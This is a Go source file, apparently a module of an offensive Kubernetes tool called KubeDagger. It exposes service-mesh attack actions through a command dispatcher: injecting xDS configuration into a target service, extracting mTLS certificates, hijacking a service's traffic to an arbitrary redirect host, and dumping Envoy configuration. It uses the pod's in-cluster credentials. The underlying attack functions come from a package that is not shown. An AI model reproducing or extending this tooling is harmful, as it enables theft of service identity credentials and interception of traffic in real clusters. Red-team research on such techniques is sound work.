package modules

import (
	"context"
	"fmt"
	"strconv"

	"github.com/yasindce1998/KubeDagger/pkg/servicemesh"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/rest"
)

type ServiceMesh struct{}

func (m *ServiceMesh) Name() string      { return "service_mesh" }
func (m *ServiceMesh) Platform() []string { return []string{"linux", "windows", "darwin"} }

func (m *ServiceMesh) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	action := args["action"]
	if action == "" {
		action = "detect"
	}

	switch action {
	case "detect":
		return m.detect(ctx)
	case "xds_inject":
		return m.xdsInject(ctx, args)
	case "certs":
		return m.extractCerts(ctx)
	case "hijack":
		return m.hijack(ctx, args)
	case "envoy_dump":
		return m.envoyDump(ctx, args)
	default:
		return &Result{Success: false, Error: fmt.Sprintf("unknown action: %s", action)}, nil
	}
}

func (m *ServiceMesh) detect(ctx context.Context) (*Result, error) {
	info, err := servicemesh.DetectMesh(ctx)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{
		Success: true,
		Output:  servicemesh.FormatMeshInfo(info),
	}, nil
}

func (m *ServiceMesh) xdsInject(ctx context.Context, args map[string]string) (*Result, error) {
	ns := args["namespace"]
	target := args["target"]
	portStr := args["port"]

	if target == "" {
		return &Result{Success: false, Error: "target service required"}, nil
	}
	if ns == "" {
		ns = "default"
	}

	port := int64(8080)
	if portStr != "" {
		p, err := strconv.ParseInt(portStr, 10, 64)
		if err == nil {
			port = p
		}
	}

	dynClient, err := getDynamicClient()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	output, err := servicemesh.InjectXDSConfig(ctx, dynClient, ns, target, port)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: true, Output: output}, nil
}

func (m *ServiceMesh) extractCerts(ctx context.Context) (*Result, error) {
	output, err := servicemesh.ExtractMTLSCerts(ctx)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: true, Output: output}, nil
}

func (m *ServiceMesh) hijack(ctx context.Context, args map[string]string) (*Result, error) {
	ns := args["namespace"]
	target := args["target"]
	redirectHost := args["redirect_host"]
	redirectPortStr := args["redirect_port"]

	if target == "" || redirectHost == "" {
		return &Result{Success: false, Error: "target and redirect_host required"}, nil
	}
	if ns == "" {
		ns = "default"
	}

	redirectPort := int64(8080)
	if redirectPortStr != "" {
		p, err := strconv.ParseInt(redirectPortStr, 10, 64)
		if err == nil {
			redirectPort = p
		}
	}

	dynClient, err := getDynamicClient()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	output, err := servicemesh.HijackTraffic(ctx, dynClient, ns, target, redirectHost, redirectPort)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: true, Output: output}, nil
}

func (m *ServiceMesh) envoyDump(ctx context.Context, args map[string]string) (*Result, error) {
	podIP := args["pod_ip"]
	if podIP == "" {
		return &Result{Success: false, Error: "pod_ip required"}, nil
	}

	output, err := servicemesh.DumpEnvoyConfig(ctx, podIP)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: true, Output: output}, nil
}

func getDynamicClient() (dynamic.Interface, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return nil, err
	}
	return dynamic.NewForConfig(config)
}

